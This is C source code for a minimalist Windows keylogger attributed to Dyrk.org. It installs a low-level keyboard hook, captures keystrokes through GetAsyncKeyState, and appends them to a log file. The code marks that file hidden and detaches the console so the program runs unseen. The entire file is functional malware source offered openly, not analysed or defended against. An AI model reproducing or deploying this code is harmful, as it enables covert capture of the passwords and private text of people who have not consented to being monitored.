/*
*
*
*   Minimalist { Windows } KeyLogger
*   (c) Dyrk.org 2019 - 2020
*
*
*/

#include "main.h"

/*
*
*   Main File
*
*
*
**/

// Hook to detect Keyboard Event - Need GetMessage to Work
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam,LPARAM lParam){
    int key;
    key = getKeyPressed();
    if (key >=32){
        appendFile(_KEYLOG_FILENAME_, key);
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}


// Quick way to detect if File exist
bool logFileExist(char *filename){
    struct stat buffer;
    return (stat (filename, &buffer) == 0);
}


// Create Hidden File
void createFile(char *filename, bool hidden){
    FILE *pFile;
    if (logFileExist(filename) == false){
        pFile = fopen(filename, "w");
        fprintf(pFile, "");
        fclose(pFile);
        if (hidden == true){
            DWORD attributes = GetFileAttributes(filename);
            SetFileAttributes(filename, FILE_ATTRIBUTE_HIDDEN);
        }
    }
}


// add text in file
bool appendFile(char *filename, char letter){
    FILE *pFile;
    pFile = fopen(filename, "a+");
    if (pFile != NULL) {
        fprintf(pFile, "%c", letter);
        fclose(pFile);
        return true;
    }
    return false;
}


// detect the pressed key
int getKeyPressed(){
    int key = 0;
    for (int i = 32; i <= 90; i++) {
        key = i;
        if (GetAsyncKeyState(i) ==-32767) {
            if (GetAsyncKeyState(VK_LSHIFT) !=-32767 && i >=65 && i<=90) {
                key = i +32;
            }
            return key;
        }
    }
    return -1;
}


int main() {
    MSG msg;
    bool bRet;
    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    createFile(_KEYLOG_FILENAME_, true);
    FreeConsole();
    while ((bRet = GetMessage( &msg, NULL, 0, 0 )) != 0){
    }
}

